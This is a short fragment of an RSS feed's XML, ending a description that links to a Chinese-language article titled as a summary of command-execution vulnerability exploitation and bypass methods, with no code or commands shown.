&gt;命令执行漏洞利用及绕过方式总结&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;</description></item></channel></rss>